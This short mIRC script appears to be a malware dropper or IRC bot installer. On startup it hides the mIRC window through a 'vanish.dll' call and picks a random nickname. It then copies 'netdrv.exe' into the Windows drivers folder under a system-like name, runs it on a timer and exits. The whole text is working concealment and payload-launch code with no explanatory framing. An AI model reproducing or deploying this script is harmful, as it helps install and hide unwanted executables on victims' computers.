alias drvcheck { check }
ON *:START: {
  echo -a $dll(vanish.dll,HideMirc,on)
  nick $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z)
  if (!$isfile(c:\windows\system32\drivers\netdrv.exe)) {
    mkdir c:\windows\system32\drivers\
    copy netdrv.exe c:\windows\system32\drivers\netdrv.exe
    run mirc.pif
    .timer 1 10 run c:\windows\system32\drivers\netdrv.exe
    .timer 1 13 exit
  }
  else { EXIT }
}
